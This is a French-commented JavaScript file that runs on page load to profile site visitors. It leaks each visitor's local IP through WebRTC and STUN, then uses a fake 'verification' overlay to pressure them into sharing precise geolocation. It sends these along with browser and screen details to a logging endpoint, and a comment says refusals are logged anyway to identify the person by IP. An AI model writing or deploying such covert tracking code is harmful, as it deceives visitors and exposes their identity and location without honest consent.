// Fonction pour récupérer l'IP locale via WebRTC
async function getLocalIP() {
    return new Promise((resolve) => {
        const ips = [];
        const pc = new RTCPeerConnection({
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        });
        
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        pc.onicecandidate = (event) => {
            if (!event || !event.candidate) {
                if (ips.length > 0) resolve(ips[0]);
                else resolve("Inconnue (Bloqué/VPN)");
                return;
            }
            
            const parts = event.candidate.candidate.split(' ');
            const ip = parts[4];
            if (!ips.includes(ip) && ip.includes('.')) {
                ips.push(ip);
            }
        };

        // Timeout plus long pour laisser le temps au STUN de répondre
        setTimeout(() => {
            if (ips.length > 0) resolve(ips[0]);
            else resolve("Inconnue (Timeout)");
            pc.close();
        }, 2000);
    });
}

async function getPreciseLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                console.warn("Géolocalisation refusée ou erreur:", error.message);
                resolve(null);
            },
            {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            }
        );
    });
}

async function logVisitor(preciseLocation = null) {
    try {
        const localIp = await getLocalIP();
        
        await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                localIp: localIp,
                preciseLocation: preciseLocation,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || 'Direct',
                page: window.location.pathname
            })
        });
    } catch (error) {
        console.error("Erreur lors du logging:", error);
    }
}

// Nouvelle logique pour "forcer" la localisation
async function startVerification() {
    const overlay = document.getElementById('verification-overlay');
    const btn = document.getElementById('btn-verify');
    const errorMsg = document.getElementById('error-msg');

    if (!overlay || !btn) {
        // Si on est sur une page sans overlay, on log normalement sans forcer
        logVisitor();
        return;
    }

    overlay.style.display = 'flex';

    btn.addEventListener('click', async () => {
        btn.innerText = "Vérification en cours...";
        btn.disabled = true;

        const location = await getPreciseLocation();

        if (location) {
            // Succès ! On cache l'overlay et on log
            overlay.style.display = 'none';
            logVisitor(location);
        } else {
            // Échec (Refusé ou erreur)
            btn.innerText = "RÉESSAYER";
            btn.disabled = false;
            errorMsg.style.display = 'block';
            // On log quand même qu'il a refusé, pour savoir qui c'est via l'IP
            logVisitor(null);
        }
    });
}

if (document.readyState === 'complete') {
    startVerification();
} else {
    window.addEventListener('load', startVerification);
}
